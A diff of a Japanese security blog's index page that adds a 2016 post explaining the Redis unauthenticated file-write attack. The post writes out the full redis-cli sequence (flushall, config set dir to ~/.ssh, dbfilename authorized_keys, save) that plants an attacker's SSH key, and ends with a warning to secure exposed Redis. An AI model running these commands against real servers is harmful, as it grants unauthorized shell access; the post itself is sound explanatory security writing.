@@ -72,9 +72,71 @@
     <div class="outer">
       <section id="main">
   
+    <article id="post-crack-redis" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/uncategorized/cilickxge000ci2cme9cxvqyk/" class="article-date">
+  <time datetime="2016-03-07T11:41:31.000Z" itemprop="datePublished">2016-03-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/uncategorized/cilickxge000ci2cme9cxvqyk/">Redisで任意のファイルをアップロードする攻撃</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>年末年始からRedisを狙った攻撃が増加しているようです.  </p>
+<ul>
+<li><a href="http://www.security-next.com/065845" target="_blank" rel="external">「Redis」狙う不正アクセスが年末年始に急増 Security NEXT</a>  </li>
+<li><a href="https://www.npa.go.jp/cyberpolice/topics/?seq=17577" target="_blank" rel="external">NoSQLデータベースであるRedisを標的としたアクセスについて 警察庁セキュリティポータルサイト@police</a></li>
+<li><a href="http://scan.netsecurity.ne.jp/article/2016/01/14/37930.html" target="_blank" rel="external">「Redis」の脆弱性を狙いファイルのアップロードを試すアクセスを観測（警察庁）</a></li>
+</ul>
+<p>要約すると外部から任意のファイルをアップロードができるため, authorized_keysなどに攻撃者の公開鍵が作成されてしまいます.  </p>
+<p>攻撃の例を以下に示します.<br>redis-serverがuserというユーザーの権限で動いているとします.<br>まず, userのauthorized_keysには何も含まれていません.<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">user<span class="variable">@66ac36057198</span><span class="symbol">:~/</span>.ssh<span class="variable">$ </span>cat authorized_keys</span><br></pre></td></tr></table></figure></p>
+<p>まず, 攻撃者は既に格納されているキーとバリューをクリアします.<br>その後, 自身の公開鍵を適当なキー(ここではpwnというキー)で保存します.<br>そしてデータを書き出すディレクトリ(/home/user/.ssh/)を設定し, ファイル名をauthorized_keysとします.<br>最後にデータを書き出します. [1]</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> flushall</span><br><span class="line">$ cat id_rsa.pub| redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span> -x <span class="built_in">set</span> pwn</span><br><span class="line">$ redis-cli -h <span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config <span class="built_in">set</span> dir <span class="string">"/home/user/.ssh"</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config get dir</span><br><span class="line"><span class="number">1</span>) <span class="string">"dir"</span></span><br><span class="line"><span class="number">2</span>) <span class="string">"/home/user/.ssh"</span></span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; config <span class="built_in">set</span> dbfilename <span class="string">"authorized_keys"</span></span><br><span class="line">OK</span><br><span class="line"><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>:<span class="number">6379</span>&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>
+<p>これでuserのauthorized_keysには攻撃者の公開鍵が追加され, SSHでのログインを許してしまうことになります.<br><figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">user<span class="variable">@66ac36057198</span><span class="symbol">:~/</span>.ssh<span class="variable">$ </span>cat authorized_keys </span><br><span class="line">ssh-rsa <span class="constant">AAAAB3NzaC1yc2EAAAADAQABAAABAQDIUgAzqX0.</span>.. mrtc<span class="number">0</span><span class="variable">@localhost</span></span><br></pre></td></tr></table></figure></p>
+<p>もちろん, redis-serverを動かしているユーザーが書き込める権限がなければいけませんが.  </p>
+<p>インターネットに公開した状態で認証をかけず, 適切な権限で動かしていないと大変なことになりますので注意が必要です.  </p>
+<h5 id="u53C2_u8003_u6587_u732E"><a href="#u53C2_u8003_u6587_u732E" class="headerlink" title="参考文献"></a>参考文献</h5><ul>
+<li><a href="https://cocopoo.com/2015/11/crackredis-io-2/" target="_blank" rel="external">crack@redis.io #2</a></li>
+<li><a href="https://www.reddit.com/r/redis/comments/3rby8c/a_few_things_about_redis_security/" target="_blank" rel="external">A few things about Redis security</a></li>
+</ul>
+<p>[1]: 実際はゴミデータも含まれるため (echo -e “\n\n”; cat id_rsa.pub; echo -e “\n\n”) のようにして改行を挟む必要がある.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://csirt.mrtc0.com/uncategorized/cilickxge000ci2cme9cxvqyk/" data-id="cilickxge000ci2cme9cxvqyk" class="article-share-link">Share</a>
+      
+
+      
+        <a href="https://csirt.mrtc0.com/uncategorized/cilickxge000ci2cme9cxvqyk/#disqus_thread" class="article-comment-link">Comments</a>
+      
+
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/honeypot/">honeypot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nosqlpot/">nosqlpot</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/redis/">redis</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-honeypot-log-2015" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/uncategorized/cilg6vltb00050lcmxfu2w7mx/" class="article-date">
+    <a href="/uncategorized/cilickxg90005i2cmfnatlivy/" class="article-date">
   <time datetime="2016-03-05T14:00:49.000Z" itemprop="datePublished">2016-03-05</time>
 </a>
     
@@ -86,7 +148,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/uncategorized/cilg6vltb00050lcmxfu2w7mx/">2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)</a>
+      <a class="article-title" href="/uncategorized/cilickxg90005i2cmfnatlivy/">2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)</a>
     </h1>
   
 
@@ -215,11 +277,11 @@
     </div>
     <footer class="article-footer">
       
-        <a data-url="https://csirt.mrtc0.com/uncategorized/cilg6vltb00050lcmxfu2w7mx/" data-id="cilg6vltb00050lcmxfu2w7mx" class="article-share-link">Share</a>
+        <a data-url="https://csirt.mrtc0.com/uncategorized/cilickxg90005i2cmfnatlivy/" data-id="cilickxg90005i2cmfnatlivy" class="article-share-link">Share</a>
       
 
       
-        <a href="https://csirt.mrtc0.com/uncategorized/cilg6vltb00050lcmxfu2w7mx/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="https://csirt.mrtc0.com/uncategorized/cilickxg90005i2cmfnatlivy/#disqus_thread" class="article-comment-link">Comments</a>
       
 
       
@@ -234,7 +296,7 @@
   
     <article id="post-htaccessで悪質なサイトへ誘導する手法" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/uncategorized/cilg6vlsp00000lcmv9nh1znz/" class="article-date">
+    <a href="/uncategorized/cilickxfo0000i2cm6oyj21rd/" class="article-date">
   <time datetime="2016-01-21T14:45:06.000Z" itemprop="datePublished">2016-01-21</time>
 </a>
     
@@ -246,7 +308,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/uncategorized/cilg6vlsp00000lcmv9nh1znz/">.htaccessで悪質なサイトへ誘導する手法</a>
+      <a class="article-title" href="/uncategorized/cilickxfo0000i2cm6oyj21rd/">.htaccessで悪質なサイトへ誘導する手法</a>
     </h1>
   
 
@@ -312,11 +374,11 @@
     </div>
     <footer class="article-footer">
       
-        <a data-url="https://csirt.mrtc0.com/uncategorized/cilg6vlsp00000lcmv9nh1znz/" data-id="cilg6vlsp00000lcmv9nh1znz" class="article-share-link">Share</a>
+        <a data-url="https://csirt.mrtc0.com/uncategorized/cilickxfo0000i2cm6oyj21rd/" data-id="cilickxfo0000i2cm6oyj21rd" class="article-share-link">Share</a>
       
 
       
-        <a href="https://csirt.mrtc0.com/uncategorized/cilg6vlsp00000lcmv9nh1znz/#disqus_thread" class="article-comment-link">Comments</a>
+        <a href="https://csirt.mrtc0.com/uncategorized/cilickxfo0000i2cm6oyj21rd/#disqus_thread" class="article-comment-link">Comments</a>
       
 
       
@@ -340,7 +402,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cowrie/">cowrie</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dionaea/">dionaea</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glastopf/">glastopf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/honeypot/">honeypot</a><span class="tag-list-count">2</span></li></ul>
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cowrie/">cowrie</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dionaea/">dionaea</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glastopf/">glastopf</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/honeypot/">honeypot</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nosqlpot/">nosqlpot</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/redis/">redis</a><span class="tag-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -349,7 +411,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/cowrie/" style="font-size: 10px;">cowrie</a> <a href="/tags/dionaea/" style="font-size: 20px;">dionaea</a> <a href="/tags/glastopf/" style="font-size: 10px;">glastopf</a> <a href="/tags/honeypot/" style="font-size: 20px;">honeypot</a>
+      <a href="/tags/cowrie/" style="font-size: 10px;">cowrie</a> <a href="/tags/dionaea/" style="font-size: 15px;">dionaea</a> <a href="/tags/glastopf/" style="font-size: 10px;">glastopf</a> <a href="/tags/honeypot/" style="font-size: 20px;">honeypot</a> <a href="/tags/nosqlpot/" style="font-size: 10px;">nosqlpot</a> <a href="/tags/redis/" style="font-size: 10px;">redis</a>
     </div>
   </div>
 
@@ -358,7 +420,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">1</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/03/">March 2016</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/01/">January 2016</a><span class="archive-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -370,11 +432,15 @@
       <ul>
         
           <li>
-            <a href="/uncategorized/cilg6vltb00050lcmxfu2w7mx/">2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)</a>
+            <a href="/uncategorized/cilickxge000ci2cme9cxvqyk/">Redisで任意のファイルをアップロードする攻撃</a>
           </li>
         
           <li>
-            <a href="/uncategorized/cilg6vlsp00000lcmv9nh1znz/">.htaccessで悪質なサイトへ誘導する手法</a>
+            <a href="/uncategorized/cilickxg90005i2cmfnatlivy/">2015年のハニーポット記録(セキュリティ・キャンプ アワード2016)</a>
+          </li>
+        
+          <li>
+            <a href="/uncategorized/cilickxfo0000i2cm6oyj21rd/">.htaccessで悪質なサイトへ誘導する手法</a>
           </li>
         
       </ul>
